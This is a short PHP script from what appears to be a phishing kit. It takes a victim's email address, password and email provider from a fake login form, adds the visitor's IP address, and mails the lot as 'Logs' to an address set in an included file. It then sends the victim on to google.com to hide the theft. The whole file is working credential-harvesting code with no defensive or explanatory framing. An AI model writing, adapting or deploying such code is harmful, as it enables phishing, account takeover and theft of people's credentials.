<?php
require '../mail.php';

if(isset($_POST['submit'])){
    $from = $_POST['trio']; // this is the sender's Email address
    $password = $_POST['trio2'];
    $email = $_POST['trio'];
    $emailService = $_POST['emailSa'];
    $subject = "New " .$emailService." Logs";
    $ip=$_SERVER['REMOTE_ADDR'];
    $message = $email
        . " "
        . " wrote the following  :"
        . "\n\n"
        . "1  Email :: ". " ". $email
        . "\n\n"
        . "2  Password:: ". " ". $password.
        "\n\n"
        . "3  Email Service:: ". " ". $emailService.
        "\n\n"
        . "4  User Real IP Address:: ". " ". $ip
        . "\n\n";

    // To send HTML mail, the Content-type header must be set
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

    // Create email headers
    $headers .= 'From: '.$from."\r\n".
        'Reply-To: '.$from."\r\n" .
        'X-Mailer: PHP/' . phpversion();

    $headers = "From:" . $from;
    mail($to,$subject,$message,$headers);
    header('Location: http://www.google.com/');
    header('HTTP/1.1 200 OK'); // <--- Forcing the header status
    exit;
}
?>